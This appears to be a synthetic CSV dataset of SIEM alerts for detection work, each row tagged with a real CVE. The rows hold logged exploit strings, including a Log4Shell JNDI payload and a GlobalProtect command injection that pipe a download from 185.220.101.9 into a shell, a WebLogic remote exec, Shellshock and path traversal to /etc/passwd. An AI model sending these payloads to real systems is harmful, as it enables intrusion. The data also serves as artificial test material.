alert,real_cves,dataset_type,timestamp,level,description,rule_id,fired_times,groups,agent,manager,alert_id,full_log,data
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""POST /api/v1/auth HTTP/1.1\"" 500 1244 \""-\"" \""${jndi:ldap://185.220.101.9:1389/Basic/Command/Base64/Y3VybCBodHRwOi8vMTg1LjIyMC4xMDEuOS9zaGVsbC5zaCB8IGJhc2g=}\"""", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP"", ""srcip"": ""185.220.101.9"", ""id"": ""500"", ""url"": ""/api/v1/auth""}, ""location"": ""/var/log/nginx/access.log""}",['CVE-2021-44228'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},21761742,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""POST /api/v1/auth HTTP/1.1"" 500 1244 ""-"" ""${jndi:ldap://185.220.101.9:1389/Basic/Command/Base64/Y3VybCBodHRwOi8vMTg1LjIyMC4xMDEuOS9zaGVsbC5zaCB8IGJhc2g=}""","{'protocol': 'HTTP', 'srcip': '185.220.101.9', 'id': '500', 'url': '/api/v1/auth'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""{\""timestamp\"":\""2026-06-16T10:30:00.000000+0000\"",\""event_type\"":\""alert\"",\""src_ip\"":\""185.220.101.9\"",\""dest_ip\"":\""172.16.5.10\"",\""proto\"":\""TCP\"",\""alert\"":{\""signature\"":\""ET EXPLOIT MS17-010 SMBv1 FEA List Overflow\"",\""severity\"":1},\""payload\"":\""\\\\xffSMB\\\\x32\\\\x00\\\\x00\\\\x00\\\\x00[...TRUNCATED_PAYLOAD...]\""}"", ""decoder"": {""name"": ""json""}, ""data"": {""protocol"": ""TCP"", ""srcip"": ""185.220.101.9"", ""id"": ""2024218"", ""url"": ""srv.sys""}, ""location"": ""/var/log/suricata/eve.json""}",['CVE-2017-0144'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},88452635,"{""timestamp"":""2026-06-16T10:30:00.000000+0000"",""event_type"":""alert"",""src_ip"":""185.220.101.9"",""dest_ip"":""172.16.5.10"",""proto"":""TCP"",""alert"":{""signature"":""ET EXPLOIT MS17-010 SMBv1 FEA List Overflow"",""severity"":1},""payload"":""\\xffSMB\\x32\\x00\\x00\\x00\\x00[...TRUNCATED_PAYLOAD...]""}","{'protocol': 'TCP', 'srcip': '185.220.101.9', 'id': '2024218', 'url': 'srv.sys'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""POST /global-protect/login.esp HTTP/1.1\"" 200 54 \""-\"" \""curl/7.81.0\"" \""SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/cmd=\\`curl 185.220.101.9/x|sh\\`\"""", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP"", ""srcip"": ""185.220.101.9"", ""id"": ""200"", ""url"": ""/global-protect/login.esp""}, ""location"": ""/var/log/nginx/sslgpw_access.log""}",['CVE-2024-3400'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},20892515,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""POST /global-protect/login.esp HTTP/1.1"" 200 54 ""-"" ""curl/7.81.0"" ""SESSID=./../../../opt/panlogs/tmp/device_telemetry/minute/cmd=\`curl 185.220.101.9/x|sh\`""","{'protocol': 'HTTP', 'srcip': '185.220.101.9', 'id': '200', 'url': '/global-protect/login.esp'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""type=SYSCALL msg=audit(1718533800.441:982): arch=c000003e syscall=1 success=yes exit=4096 a0=4 a1=7f8e9a20 a2=1000 a3=0 items=0 ppid=882 pid=1042 auid=1001 uid=1001 gid=1001 euid=1001 comm=\""sh\"" exe=\""/usr/bin/sh\"" payload=0x524f4f543a583a30[...]TRUNCATED_PAYLOAD..."", ""decoder"": {""name"": ""auditd""}, ""data"": {""protocol"": ""SYSCALL"", ""srcip"": ""185.220.101.9"", ""id"": ""1"", ""url"": ""/usr/bin/sh""}, ""location"": ""/var/log/audit/audit.log""}",['CVE-2022-0847'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},45670800,"type=SYSCALL msg=audit(1718533800.441:982): arch=c000003e syscall=1 success=yes exit=4096 a0=4 a1=7f8e9a20 a2=1000 a3=0 items=0 ppid=882 pid=1042 auid=1001 uid=1001 gid=1001 euid=1001 comm=""sh"" exe=""/usr/bin/sh"" payload=0x524f4f543a583a30[...]TRUNCATED_PAYLOAD...","{'protocol': 'SYSCALL', 'srcip': '185.220.101.9', 'id': '1', 'url': '/usr/bin/sh'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""POST /psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet?action=exec&cmd=id HTTP/1.1\"" 200 2048 \""-\"" \""python-requests/2.31.0\"" \""payload=\\xac\\xed\\x00\\x05\\x73\\x72\\x00\\x11\\x6a\\x61\\x76\\x61\\x2e\\x75\\x74\\x69\\x6c\\x2e\\x48[...TRUNCATED_PAYLOAD...]\"""", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP"", ""srcip"": ""185.220.101.9"", ""id"": ""200"", ""url"": ""/psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet""}, ""location"": ""/u01/app/oracle/config/domains/peoplesoft/servers/PIA/logs/access.log""}",['CVE-2026-35273'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},92767129,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""POST /psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet?action=exec&cmd=id HTTP/1.1"" 200 2048 ""-"" ""python-requests/2.31.0"" ""payload=\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48[...TRUNCATED_PAYLOAD...]""","{'protocol': 'HTTP', 'srcip': '185.220.101.9', 'id': '200', 'url': '/psc/ps/EXTERNAL/PUM/EnvironmentManagementServlet'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""Jun 16 10:30:00 DC-PROD-01 Microsoft-Windows-Netlogon[5805]: The Netlogon service failed to authenticate the connection from the remote computer ATTACK-STATION. The following error occurred: Access is denied. Client Credential: 0000000000000000[...TRUNCATED_PAYLOAD...] NegotiationFlags: 0x212fffff"", ""decoder"": {""name"": ""windows""}, ""data"": {""protocol"": ""MS-NRPC"", ""srcip"": ""185.220.101.9"", ""id"": ""5805"", ""url"": ""lsass.exe/netlogon""}, ""location"": ""C:\\Windows\\System32\\Winevt\\Logs\\System.evtx""}",['CVE-2020-1472'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},89294974,Jun 16 10:30:00 DC-PROD-01 Microsoft-Windows-Netlogon[5805]: The Netlogon service failed to authenticate the connection from the remote computer ATTACK-STATION. The following error occurred: Access is denied. Client Credential: 0000000000000000[...TRUNCATED_PAYLOAD...] NegotiationFlags: 0x212fffff,"{'protocol': 'MS-NRPC', 'srcip': '185.220.101.9', 'id': '5805', 'url': 'lsass.exe/netlogon'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1\"" 200 1042 \""-\"" \""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\"""", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP/1.1"", ""srcip"": ""185.220.101.9"", ""id"": ""200"", ""url"": ""/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd""}, ""location"": ""/var/log/pulsesecure/access.log""}",['CVE-2019-11510'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},70896328,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""GET /dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/ HTTP/1.1"" 200 1042 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36""","{'protocol': 'HTTP/1.1', 'srcip': '185.220.101.9', 'id': '200', 'url': '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""type=EXECVE msg=audit(1718533800.000:982): argc=4 a0=\""sudoedit\"" a1=\""-s\"" a2=\""\\\\\"" a3=\""AAAAAAAAAAAAAAAAAAAA[...TRUNCATED_PAYLOAD...]\"" ppid=1024 pid=2045 auid=1000 uid=1000 euid=0 comm=\""sudoedit\"" exe=\""/usr/bin/sudo\"""", ""decoder"": {""name"": ""auditd""}, ""data"": {""protocol"": ""SYSCALL"", ""srcip"": ""185.220.101.9"", ""id"": ""59"", ""url"": ""/usr/bin/sudo""}, ""location"": ""/var/log/audit/audit.log""}",['CVE-2021-3156'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},60346805,"type=EXECVE msg=audit(1718533800.000:982): argc=4 a0=""sudoedit"" a1=""-s"" a2=""\\"" a3=""AAAAAAAAAAAAAAAAAAAA[...TRUNCATED_PAYLOAD...]"" ppid=1024 pid=2045 auid=1000 uid=1000 euid=0 comm=""sudoedit"" exe=""/usr/bin/sudo""","{'protocol': 'SYSCALL', 'srcip': '185.220.101.9', 'id': '59', 'url': '/usr/bin/sudo'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(\""curl http://185.220.101.9/bin.sh[...TRUNCATED_PAYLOAD...]\"");'); HTTP/1.1\"" 200 1244"", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP/1.1"", ""srcip"": ""185.220.101.9"", ""id"": ""200"", ""url"": ""/console/images/%252E%252E%252Fconsole.portal""}, ""location"": ""/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/access.log""}",['CVE-2020-14882'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},60882480,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""GET /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=com.tangosol.coherence.mvel2.sh.ShellSession('java.lang.Runtime.getRuntime().exec(""curl http://185.220.101.9/bin.sh[...TRUNCATED_PAYLOAD...]"");'); HTTP/1.1"" 200 1244","{'protocol': 'HTTP/1.1', 'srcip': '185.220.101.9', 'id': '200', 'url': '/console/images/%252E%252E%252Fconsole.portal'}"
"{""timestamp"": ""2026-06-16T10:30:00.000+0000"", ""rule"": {""level"": 12, ""description"": ""Critical security event: Anomalous behavior or exploit payload detected by system monitoring."", ""id"": ""100200"", ""firedtimes"": 1, ""mail"": true, ""groups"": [""attack"", ""security_event"", ""mitre_t1190""]}, ""agent"": {""id"": ""010"", ""name"": ""core-infrastructure-node"", ""ip"": ""172.16.5.10""}, ""full_log"": ""185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] \""GET /cgi-bin/status.cgi HTTP/1.1\"" 200 512 \""-\"" \""() { :; }; /bin/ba [...TRUNCATED_PAYLOAD...]\"""", ""decoder"": {""name"": ""web-accesslog""}, ""data"": {""protocol"": ""HTTP"", ""srcip"": ""185.220.101.9"", ""id"": ""200"", ""url"": ""/cgi-bin/status.cgi""}, ""location"": ""/var/log/apache2/access.log""}",['CVE-2014-6271'],limpio,2026-06-16T10:30:00.000+0000,12,Critical security event: Anomalous behavior or exploit payload detected by system monitoring.,100200,1,"['attack', 'security_event', 'mitre_t1190']","{'id': '010', 'name': 'core-infrastructure-node', 'ip': '172.16.5.10'}",{},82122458,"185.220.101.9 - - [16/Jun/2026:10:30:00 +0000] ""GET /cgi-bin/status.cgi HTTP/1.1"" 200 512 ""-"" ""() { :; }; /bin/ba [...TRUNCATED_PAYLOAD...]""","{'protocol': 'HTTP', 'srcip': '185.220.101.9', 'id': '200', 'url': '/cgi-bin/status.cgi'}"
